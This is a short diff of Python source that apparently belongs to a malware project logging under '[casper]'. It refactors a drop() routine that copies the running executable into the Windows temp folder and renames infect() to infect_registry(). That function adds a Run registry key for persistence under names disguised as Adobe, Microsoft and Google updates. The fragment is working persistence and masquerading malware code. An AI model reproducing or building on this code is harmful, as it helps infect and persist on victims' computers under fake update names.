@@ -5,6 +5,13 @@ from includes import *
 
 value_names = ["Adobe Update","Microsoft Update","Windows Update","OneDrive Update","Acrobat Reader Plugin","Outlook Plugin","Microsoft Office Update","Google Chrome Update"]
 
+def drop():
+	try:
+		shutil.copyfile(os.path.join(os.getcwd(),sys.argv[0]),"c:\\windows\\temp\\"+sys.argv[0])
+		return True
+	except Exception as e:
+		return False
+
 def registry():
 	try:
 		key = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -14,14 +21,7 @@ def registry():
 	except Exception as e:
 		return False
 
-def drop():
-	try:
-		shutil.copyfile(os.path.join(os.getcwd(),sys.argv[0]),"c:\\windows\\temp\\"+sys.argv[0])
-		return True
-	except Exception as e:
-		return False
-
-def infect():
+def infect_registry():
 	logging.debug("[casper] Attempting to add registry key under >> Software\Microsoft\Windows\CurrentVersion\Run")
 	if (registry() == True):
 		logging.debug("[casper] Registry key was successfully created")
